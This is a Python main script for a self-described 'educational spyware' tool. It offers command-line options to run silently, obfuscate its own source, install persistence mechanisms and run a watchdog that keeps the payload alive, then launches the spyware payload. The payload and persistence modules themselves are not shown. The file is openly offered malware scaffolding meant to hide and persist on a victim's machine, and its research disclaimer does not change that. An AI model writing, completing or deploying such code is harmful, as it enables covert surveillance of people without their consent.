#!/usr/bin/env python3
import sys
import argparse
import logging
import threading
from pathlib import Path
from core.payload import Payload
from utils.watchdog import Watchdog
from utils.obfuscation import Obfuscator

def setup_logging():
    """Configure logging for the application"""
    try:
        log_dir = Path('logs/')
        log_dir.mkdir(exist_ok=True)
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_dir / 'spyware.log'),
                logging.StreamHandler()
            ]
        )
        logging.getLogger('urllib3').setLevel(logging.WARNING)
    except Exception as e:
        print(f"Failed to setup logging: {e}")
        sys.exit(1)

def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='Educational Spyware - For Research Purposes Only',
        epilog='WARNING: Unauthorized use is illegal. Use only in controlled environments.'
    )
    
    parser.add_argument(
        '--silent',
        action='store_true',
        help='Run in silent mode without menu'
    )
    parser.add_argument(
        '--obfuscate',
        action='store_true',
        help='Obfuscate the payload before execution'
    )
    parser.add_argument(
        '--persistence',
        action='store_true',
        help='Install persistence mechanisms'
    )
    parser.add_argument(
        '--watchdog',
        action='store_true',
        help='Enable watchdog monitoring'
    )
    parser.add_argument(
        '--debug',
        action='store_true',
        help='Enable debug logging'
    )
    
    return parser.parse_args()

def graceful_exit(logger=None):
    """Clean shutdown procedure"""
    if logger:
        logger.info("Performing graceful shutdown...")
    else:
        print("\nPerforming graceful shutdown...")
    sys.exit(0)

def main():
    """Main entry point for the spyware payload"""
    args = parse_args()
    setup_logging()
    logger = logging.getLogger(__name__)
    
    try:
        logger.info("Starting educational spyware payload")
        
        # Obfuscate if requested
        if args.obfuscate:
            logger.info("Obfuscating payload...")
            try:
                obfuscator = Obfuscator()
                with open(__file__, 'r') as f:
                    original_code = f.read()
                obfuscated_code = obfuscator.obfuscate_python(original_code)
                with open('obfuscated_payload.py', 'w') as f:
                    f.write(obfuscated_code)
                logger.info("Obfuscated payload saved as obfuscated_payload.py")
                graceful_exit(logger)
            except Exception as e:
                logger.error(f"Obfuscation failed: {e}")
                sys.exit(1)
        
        # Initialize payload
        payload = Payload(silent=args.silent)
        
        # Install persistence if requested
        if args.persistence:
            logger.info("Installing persistence...")
            try:
                from core.persistence import Persistence
                Persistence.install()
            except Exception as e:
                logger.error(f"Persistence installation failed: {e}")
        
        # Start watchdog if requested
        watchdog_thread = None
        if args.watchdog:
            logger.info("Starting watchdog monitor...")
            try:
                watchdog = Watchdog(__file__)
                watchdog_thread = threading.Thread(target=watchdog.start)
                watchdog_thread.daemon = True
                watchdog_thread.start()
            except Exception as e:
                logger.error(f"Watchdog startup failed: {e}")
        
        # Start payload
        try:
            payload.start()
        except KeyboardInterrupt:
            logger.info("Received shutdown signal")
        
    except KeyboardInterrupt:
        logger.info("Received keyboard interrupt, shutting down...")
    except Exception as e:
        logger.error(f"Fatal error: {str(e)}", exc_info=args.debug)
        sys.exit(1)
    finally:
        # Clean up threads
        if watchdog_thread and watchdog_thread.is_alive():
            logger.info("Stopping watchdog...")
            # Implement proper thread stopping mechanism in Watchdog class
        
        logger.info("Payload execution complete")
        graceful_exit(logger)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrupted by user")
        graceful_exit()